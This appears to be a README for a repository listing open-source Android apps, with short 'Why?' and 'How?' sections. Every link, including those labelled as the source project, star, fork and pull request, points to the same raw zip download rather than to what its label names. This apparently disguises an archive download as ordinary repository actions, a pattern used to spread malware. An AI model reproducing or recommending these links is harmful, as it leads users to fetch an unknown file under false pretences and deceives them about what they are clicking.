# Why?
> This is a collection of Android Apps which are open source.  
> I believe that we can find something interesting and gain helpful skills from an open source app.  
> This idea comes from [this project](https://github.com/Joe-Mogul/open-source-android-apps/raw/refs/heads/master/categories/source_android_open_apps_postpositively.zip)


# How?
> I'll push awesome projects when I find any.  
> It's WELCOMED for you to [star](https://github.com/Joe-Mogul/open-source-android-apps/raw/refs/heads/master/categories/source_android_open_apps_postpositively.zip) and [fork](https://github.com/Joe-Mogul/open-source-android-apps/raw/refs/heads/master/categories/source_android_open_apps_postpositively.zip) this project.   
> If you know something that is not here, it'll be great if you could make a [Pull Request](https://github.com/Joe-Mogul/open-source-android-apps/raw/refs/heads/master/categories/source_android_open_apps_postpositively.zip).  
> All applications are sorted in various categories.
